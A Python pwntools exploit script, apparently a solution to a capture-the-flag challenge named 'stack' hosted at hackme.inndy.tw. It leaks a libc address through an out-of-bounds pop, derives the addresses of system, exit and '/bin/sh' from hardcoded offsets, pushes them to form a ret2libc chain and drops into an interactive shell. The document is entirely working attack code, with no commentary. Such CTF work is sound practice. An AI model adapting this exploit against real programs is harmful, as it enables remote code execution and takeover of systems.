#!/usr/bin/python

from pwn import *

def push(val):
    s.recvuntil('Cmd >>\n')
    s.sendline('i ' + str(val))
    
def pop():
    s.recvuntil('Cmd >>\n')
    s.sendline('p')

def clear():
    s.recvuntil('Cmd >>\n')
    s.sendline('c')

def change(num):
    return (num^0xffffffff)+1

 


my_off_libc_main = 0x18d90
my_off_system = 0x3d200
my_off_binsh = 0x17e0cf
my_off_exit = 0x303d0
off_libc_main = 0x18540
off_system = 0x3ad80
off_binsh = 0x15ba3f
off_exit = 0x2e9b0

config = '''
'''
context.log_level = 'debug'
#s = process('./stack')
s = remote('hackme.inndy.tw', 7716)
#gdb.attach(s)

pop()
push(93)
pop()
s.recv(8)
libc_main_241 = s.recvline()
libc_main_241 = libc_main_241[:len(libc_main_241)-1]
log.info("libc_241's receved: " + repr(libc_main_241))
libc_main_241 = int(libc_main_241, 10)
libc_main_241 = change(libc_main_241)
libc_main = libc_main_241 - 241

base = libc_main - my_off_libc_main
system = base + my_off_system
exit = base + my_off_exit
binsh = base + my_off_binsh

libc_main = libc_main -6 
base = libc_main - off_libc_main
system = base + off_system
exit = base + off_exit
binsh = base + off_binsh

log.info("libc_241's address: " + hex(libc_main_241))
log.info("base's address: " + hex(base))
log.info("system's address: " + hex(system))
log.info("exit's address: " + hex(exit))
log.info("binsh's address: " + hex(binsh))

push(-change(system))
push(-change(exit))
push(-change(binsh))
s.sendline('x')
s.interactive()
